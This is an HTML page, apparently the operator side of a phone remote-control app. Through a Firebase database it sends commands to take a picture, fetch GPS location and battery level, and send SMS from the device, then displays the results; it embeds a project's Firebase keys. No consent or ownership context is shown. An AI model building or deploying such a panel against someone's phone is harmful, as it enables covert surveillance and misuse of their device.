<!DOCTYPE html>
<html>
<head>
  <title>Control Panel</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
</head>
<body>
  <h2>Remote Control Panel</h2>

  <button onclick="sendCommand('take_picture')">Take Picture</button>
  <button onclick="sendCommand('get_location')">Get Location</button>
  <button onclick="sendCommand('get_battery')">Get Battery</button>

  <h3>Send SMS</h3>
  <input type="text" id="smsNumber" placeholder="Phone Number">
  <input type="text" id="smsText" placeholder="Message">
  <button onclick="sendSMS()">Send SMS</button>

  <h3>Latest Photo:</h3>
  <img id="photo" src="" alt="No photo yet" width="300">

  <h3>Location:</h3>
  <p id="location">Waiting...</p>

  <h3>Battery:</h3>
  <p id="battery">Waiting...</p>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyA3eivOxIpneLJYcmqAUrmVQaURCipy9oo",
      authDomain: "remotecontrolapp-47b9f.firebaseapp.com",
      databaseURL: "https://remotecontrolapp-47b9f-default-rtdb.firebaseio.com",
      projectId: "remotecontrolapp-47b9f",
      storageBucket: "remotecontrolapp-47b9f.appspot.com",
      messagingSenderId: "601641517639",
      appId: "1:601641517639:web:9c87d179951bb2811ee762"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function sendCommand(cmd) {
      db.ref("commands").set({
        action: cmd,
        time: new Date().toLocaleString()
      });
    }

    function sendSMS() {
      const number = document.getElementById("smsNumber").value;
      const message = document.getElementById("smsText").value;
      db.ref("commands").set({
        action: "send_sms",
        number: number,
        message: message,
        time: new Date().toLocaleString()
      });
    }

    db.ref("responses/photo").on("value", snapshot => {
      const data = snapshot.val();
      if (data && data.image) {
        document.getElementById("photo").src = data.image;
      }
    });

    db.ref("responses/location").on("value", snapshot => {
      const data = snapshot.val();
      if (data) {
        document.getElementById("location").textContent =
          `Latitude: ${data.lat}, Longitude: ${data.lon} (${data.time})`;
      }
    });

    db.ref("responses/battery").on("value", snapshot => {
      const data = snapshot.val();
      if (data) {
        document.getElementById("battery").textContent =
          `Battery Level: ${data.level} (${data.time})`;
      }
    });
  </script>
</body>
</html>
